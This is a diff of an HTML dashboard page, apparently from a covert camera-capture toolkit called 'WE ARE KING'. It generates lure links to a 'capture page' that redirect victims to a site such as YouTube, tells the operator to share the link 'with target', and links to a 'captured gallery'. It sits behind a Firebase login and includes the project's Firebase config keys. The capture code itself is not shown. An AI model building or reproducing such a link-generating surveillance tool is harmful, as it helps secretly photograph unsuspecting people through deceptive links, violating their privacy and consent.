@@ -2,145 +2,70 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - WE ARE KING Toolkit</title>
-    <!-- Page ko hide rakhen jab tak login check na ho jaye -->
+    <title>Camera Dashboard - WE ARE KING</title>
     <style>
-        body { 
-            display: none; 
-            background: #0f172a; 
-            color: white; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        .main-card {
-            background: #1e293b;
-            max-width: 500px;
-            margin: 50px auto;
-            padding: 30px;
-            border-radius: 20px;
-            border: 1px solid #00d2ff;
-            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
-        }
-        input {
-            width: 90%;
-            padding: 12px;
-            margin: 15px 0;
-            border-radius: 8px;
-            border: 1px solid #334155;
-            background: #0f172a;
-            color: #00d2ff;
-        }
-        .btn-gen {
-            background: #00d2ff;
-            color: #000;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .btn-gen:hover { background: #00a8cc; }
-        #resultBox {
-            margin-top: 25px;
-            padding: 15px;
-            background: rgba(0,0,0,0.3);
-            border: 1px dashed #00d2ff;
-            display: none;
-            word-break: break-all;
-        }
-        .nav-btn {
-            background: #22c55e;
-            color: white;
-            padding: 10px 20px;
-            text-decoration: none;
-            border-radius: 5px;
-            margin: 10px;
-            display: inline-block;
-        }
+        body { display: none; background: #0f172a; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; }
+        .box { background: #1e293b; padding: 30px; border-radius: 15px; border: 1px solid #00d2ff; display: inline-block; box-shadow: 0 0 20px rgba(0,210,255,0.2); }
+        input { padding: 12px; width: 280px; background: #0f172a; color: #00d2ff; border: 1px solid #334155; border-radius: 5px; }
+        button { padding: 12px 20px; background: #00d2ff; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="main-card">
-        <img src="https://files.catbox.moe/k3v3k6.png" width="60" alt="Logo">
-        <h2>KING LINK GENERATOR</h2>
-        <p style="color: #94a3b8; font-size: 14px;">Enter the target URL where you want to redirect the user.</p>
-
-        <!-- Input for Redirect URL -->
-        <input type="text" id="targetUrl" placeholder="Example: https://youtube.com">
+    <div class="box">
+        <h2 style="color: #00d2ff;">KING CAMERA GENERATOR</h2>
+        <p style="font-size: 14px; color: #94a3b8;">Enter Target URL (e.g. YouTube Link)</p>
+        <input type="text" id="targetUrl" placeholder="https://youtube.com">
+        <br>
+        <button onclick="generateLink()">GENERATE MAGIC LINK</button>
         
-        <button class="btn-gen" onclick="generateMagicLink()">GENERATE LINK</button>
-
-        <!-- Link Result Display -->
-        <div id="resultBox">
-            <p style="font-size: 13px; color: #94a3b8;">Share this link:</p>
-            <p id="finalLink" style="color: #00d2ff; font-weight: bold;"></p>
-            <button onclick="copyToClipboard()" style="background: #334155; color: white; border: none; padding: 5px 10px; cursor: pointer;">COPY</button>
+        <div id="result" style="margin-top: 25px; display: none; border-top: 1px solid #334155; padding-top: 15px;">
+            <p style="font-size: 12px; color: #94a3b8;">Share this link with target:</p>
+            <p id="finalLink" style="color: #00d2ff; font-weight: bold; word-break: break-all; font-family: monospace;"></p>
+            <button onclick="copyBtn()" style="background: #334155; color: white; font-size: 12px;">COPY LINK</button>
         </div>
     </div>
+    <br><br>
+    <a href="gallery.html" style="color: #22c55e; text-decoration: none; font-weight: bold;">[ OPEN CAPTURED GALLERY ]</a>
 
-    <div style="margin-top: 20px;">
-        <a href="gallery.html" class="nav-btn">VIEW GALLERY</a>
-        <button onclick="logoutUser()" style="background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">LOGOUT</button>
-    </div>
-
-    <!-- Firebase Scripts -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDyl_AUPvulQJtVPBEeofS0OaWADyO4acw",
-            authDomain: "camera-fc58f.firebaseapp.com",
-            databaseURL: "https://camera-fc58f-default-rtdb.firebaseio.com",
-            projectId: "camera-fc58f",
-            storageBucket: "camera-fc58f.firebasestorage.app",
-            appId: "1:1018467164860:web:b65a217d47affa6e7226b9"
+        // 1. MAIN WEBSITE CONFIG (Authentication)
+        const mainSiteConfig = {
+            apiKey: "AIzaSyC9z_N93wf9RFzEYZEIlXE8yiCcnJuWC4A",
+            authDomain: "cybertoolkit-65b65.firebaseapp.com",
+            projectId: "cybertoolkit-65b65",
+            storageBucket: "cybertoolkit-65b65.firebasestorage.app",
+            appId: "1:412853505695:web:050010f944695ddff41caa"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
+        // Initialize Main App
+        const mainApp = initializeApp(mainSiteConfig, "mainApp");
+        const auth = getAuth(mainApp);
 
-        // --- AUTH GUARD: Login Check ---
+        // Auth Guard: Check if user is logged in to CyberToolkit
         onAuthStateChanged(auth, (user) => {
             if (user) {
-                // Agar user login hai, toh body dikha do
                 document.body.style.display = "block";
-                console.log("Logged in as:", user.email);
             } else {
-                // Agar login nahi hai, toh index.html par redirect kar do
+                console.log("No session found on CyberToolkit. Redirecting...");
                 window.location.href = "index.html";
             }
         });
 
-        // Link Generate Function
-        window.generateMagicLink = function() {
+        window.generateLink = function() {
             const redirect = document.getElementById('targetUrl').value || 'https://youtube.com';
-            const domain = window.location.origin;
-            
-            // Ye ch.html (Capture Page) ka link banayega
-            const finalUrl = `${domain}/ch.html?redirect=${encodeURIComponent(redirect)}`;
-            
-            document.getElementById('finalLink').innerText = finalUrl;
-            document.getElementById('resultBox').style.display = 'block';
-        };
+            const link = `${window.location.origin}/ch.html?redirect=${encodeURIComponent(redirect)}`;
+            document.getElementById('finalLink').innerText = link;
+            document.getElementById('result').style.display = 'block';
+        }
 
-        // Copy Function
-        window.copyToClipboard = function() {
-            const linkText = document.getElementById('finalLink').innerText;
-            navigator.clipboard.writeText(linkText);
+        window.copyBtn = function() {
+            navigator.clipboard.writeText(document.getElementById('finalLink').innerText);
             alert("Link Copied!");
-        };
-
-        // Logout Function
-        window.logoutUser = function() {
-            signOut(auth).then(() => {
-                window.location.href = "index.html";
-            });
-        };
+        }
     </script>
 </body>
 </html>
